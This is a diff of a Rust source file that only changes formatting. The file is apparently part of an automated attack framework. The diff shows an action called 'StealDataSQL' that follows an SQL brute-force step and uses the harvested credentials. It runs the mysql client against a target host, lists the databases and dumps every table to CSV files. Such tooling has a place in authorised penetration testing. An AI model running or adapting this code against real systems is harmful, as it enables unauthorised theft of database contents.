@@ -13,9 +13,15 @@ use super::{build_output_dir, get_credentials};
 pub struct StealDataSql;
 
 impl Action for StealDataSql {
-    fn name(&self) -> &'static str { "StealDataSQL" }
-    fn port(&self) -> Option<u16> { Some(3306) }
-    fn parent(&self) -> Option<&'static str> { Some("SQLBruteforce") }
+    fn name(&self) -> &'static str {
+        "StealDataSQL"
+    }
+    fn port(&self) -> Option<u16> {
+        Some(3306)
+    }
+    fn parent(&self) -> Option<&'static str> {
+        Some("SQLBruteforce")
+    }
 
     fn execute<'a>(
         &'a self,
@@ -67,11 +73,15 @@ async fn steal_sql_data(
     // Step 1: List databases
     let db_output = tokio::process::Command::new("mysql")
         .args([
-            "-h", ip,
-            "-u", user,
+            "-h",
+            ip,
+            "-u",
+            user,
             &format!("-p{password}"),
             "--connect-timeout=10",
-            "-N", "-e", "SHOW DATABASES",
+            "-N",
+            "-e",
+            "SHOW DATABASES",
         ])
         .output()
         .await
@@ -127,11 +137,14 @@ async fn steal_sql_data(
             let csv_path = db_dir.join(format!("{safe_table_name}.csv"));
             let dump_output = tokio::process::Command::new("mysql")
                 .args([
-                    "-h", ip,
-                    "-u", user,
+                    "-h",
+                    ip,
+                    "-u",
+                    user,
                     &format!("-p{password}"),
                     "--connect-timeout=10",
-                    "-N", "-e",
+                    "-N",
+                    "-e",
                     &format!("SELECT * FROM {escaped_db}.{escaped_table}"),
                 ])
                 .output()
